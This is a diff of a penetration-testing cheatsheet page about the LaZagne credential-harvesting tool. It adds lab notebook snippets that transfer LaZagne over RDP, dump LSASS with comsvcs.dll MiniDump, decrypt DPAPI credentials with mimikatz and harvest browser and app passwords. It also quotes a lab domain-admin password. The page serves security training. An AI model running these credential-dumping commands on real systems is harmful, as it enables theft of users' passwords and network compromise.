@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=lazagne) · [All tools](/index)
+
 ## All supported applications
 
 **Windows PowerShell**
@@ -31,8 +33,107 @@ Results depend on the user context and whether an application actually saved cre
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=lazagne)
+## Notebook recipes
 
-## Learning and original examples
+8 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Find Credentials on Windows](/password-attacks/credential-hunting-in-windows)
+<AccordionGroup>
+
+<Accordion title="11. File transfer over a pivot">
+
+### 11. File transfer over a pivot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+xfreerdp3 /v:127.0.0.1:13389 /u:bdavid /p:'...' /cert:ignore /drive:kali,/home/kali/loot
+#   inside Windows:  copy \\tsclient\kali\Windows\LaZagne.exe C:\Users\Public\
+```
+
+</Accordion>
+
+<Accordion title="9. Credential dumping">
+
+### 9. Credential dumping
+
+**Active Directory Attack Path: Worked Lab**
+
+```cmd
+:: nanodump / comsvcs to dump lsass.dmp, then parse offline on Kali:
+rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_PID> C:\Windows\Temp\lss.dmp full
+:: then on Kali:  pypykatz lsa minidump lss.dmp
+LaZagne.exe all                 :: stored app/browser/wifi creds (use the .EXE, no Python needed)
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: LaZagne on Windows with no Python:  download the  standalone  LaZagne.exe  (PyInstaller build from the releases page) — it bundles Python + deps. Bring it over via  \\tsclient\  (RDP drive redirect) or the DMZ http server, then  LaZagne.exe all . Result here:  sekurlsa::logonpasswords  revealed  stom : calves‑warp‑learning1  (current DA password) — the key that opened the DC.
+
+```text
+LaZagne.exe
+```
+
+**Active Directory Attack Path: Worked Lab**
+
+Context from the notebook: LaZagne on Windows with no Python:  download the  standalone  LaZagne.exe  (PyInstaller build from the releases page) — it bundles Python + deps. Bring it over via  \\tsclient\  (RDP drive redirect) or the DMZ http server, then  LaZagne.exe all . Result here:  sekurlsa::logonpasswords  revealed  stom : calves‑warp‑learning1  (current DA password) — the key that opened the DC.
+
+```text
+LaZagne.exe all
+```
+
+</Accordion>
+
+<Accordion title="Browser credentials">
+
+### Browser credentials
+
+**Find Credentials on Windows**
+
+```cmd
+LaZagne.exe browsers
+```
+
+</Accordion>
+
+<Accordion title="LaZagne (the go-to)">
+
+### LaZagne (the go-to)
+
+**Find Credentials on Windows**
+
+```cmd
+LaZagne.exe all
+LaZagne.exe browsers      # only browser-stored creds
+```
+
+</Accordion>
+
+<Accordion title="4. DPAPI / browsers / app creds">
+
+### 4. DPAPI / browsers / app creds
+
+**Windows Post-Exploitation: Field Reference**
+
+```cmd
+mimikatz # dpapi::cred             :: decrypt stored credentials
+LaZagne.exe all                    :: browsers, wifi, RDP, email, etc. (STANDALONE .EXE, no Python)
+:: SharpChrome / SharpDPAPI for browser cookies + saved logins
+```
+
+</Accordion>
+
+<Accordion title="Key Takeaways">
+
+### Key Takeaways
+
+**Find Credentials on Linux**
+
+Context from the notebook: Automate the sweep with  mimipenguin  and  LaZagne all , but still grep configs/logs manually — tools miss context.
+
+```text
+LaZagne all
+```
+
+</Accordion>
+
+</AccordionGroup>
